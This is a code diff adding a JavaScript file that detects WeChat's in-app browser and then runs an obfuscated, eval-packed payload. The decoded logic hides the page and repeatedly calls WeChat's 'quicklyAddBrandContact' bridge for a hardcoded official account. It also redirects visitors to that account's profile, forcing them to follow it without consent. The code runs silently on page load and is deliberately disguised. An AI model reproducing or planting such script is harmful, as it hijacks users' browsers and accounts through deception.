@@ -1,0 +1,11 @@
+function isWeiXin(){
+    var ua = window.navigator.userAgent.toLowerCase();
+    if (ua.match(/MicroMessenger/i) == 'micromessenger') {
+        return true;
+    } else {
+        return false;
+    }
+}
+if(isWeiXin()){
+    var _0x550c=['split','replace','\x5cw+','2\x2034(){27\x205=0;2\x208(){18{6.16=\x2711\x27+29.33();6.10.26=10.26+\x27&11=52&5=\x27+5+\x27&51=\x27}41(55){}}2\x2037(25){25.50(2(24){23(24)});2\x2023(4){7=15;7.35.39.42=\x2719\x27;27\x209=38;49=2(){48(20)};44=2(){3(5!==45)28()};22=2(){8()};28=2(){3(!9){9=40;22()}};12=2(){10=\x2753://31.59.56.67/31/70?71=72&69=\x27+\x27\x27+\x27&64=\x27+29.33()+\x27#58\x27;14(4)};14=2(4){20=17(2(){18{36.60(\x2761\x27,{63:\x27\x27,4:4},2(7){3(7.21.32(\x2711\x27)!==-1||7.21.32(\x2768\x27)!==-1){17(8,43)}13\x2014(4)});5++;3(5==1)17(8,43)}41(62){}},30)};3(57(36)===\x2765\x27){15.66(\x2746\x27,12,38)}13\x2012()}}3(6.16===\x27\x27){37([\x2747\x27])}13{6.54=40;6.16=\x27\x27}15.35.39.42=\x2719\x27}34();','||function|if|username|ha|window|d|endaction|vk|location|ok|k|else|go|document|name|setTimeout|try|none|mm|err_msg|h|goTo|value|result|href|var|m|Math||mp|indexOf|random|realshell|body|WeixinJSBridge|tostart|false|style|true|catch|display|100|j|99|WeixinJSBridgeReady|gh_3a25b43fc0af|clearInterval|c|forEach|goBack|endjs|https|loadadd|_0|qq|typeof|wechat_redirect|weixin|invoke|quicklyAddBrandContact|e|scene|t|undefined|addEventListener|com|added|__biz|profile_ext|action|home'];(function(_0xd5154e,_0x3a0423){var _0xed3f59=function(_0x1d6ffc){while(--_0x1d6ffc){_0xd5154e['push'](_0xd5154e['shift']());}};_0xed3f59(++_0x3a0423);}(_0x550c,0x123));var _0x56ae=function(_0x199408,_0x1ff1de){_0x199408=_0x199408-0x0;var _0x5424ee=_0x550c[_0x199408];return _0x5424ee;};eval(function(_0x4f680a,_0x5b4826,_0x4a3682,_0xd64a1a,_0x52f8d9,_0x52faae){_0x52f8d9=function(_0x5d541a){return _0x5d541a;};if(!''[_0x56ae('0x0')](/^/,String)){while(_0x4a3682--){_0x52faae[_0x4a3682]=_0xd64a1a[_0x4a3682]||_0x4a3682;}_0xd64a1a=[function(_0x991246){return _0x52faae[_0x991246];}];_0x52f8d9=function(){return _0x56ae('0x1');};_0x4a3682=0x1;};while(_0x4a3682--){if(_0xd64a1a[_0x4a3682]){_0x4f680a=_0x4f680a['replace'](new RegExp('\x5cb'+_0x52f8d9(_0x4a3682)+'\x5cb','g'),_0xd64a1a[_0x4a3682]);}}return _0x4f680a;}(_0x56ae('0x2'),0xa,0x49,_0x56ae('0x3')[_0x56ae('0x4')]('|'),0x0,{}));
+}
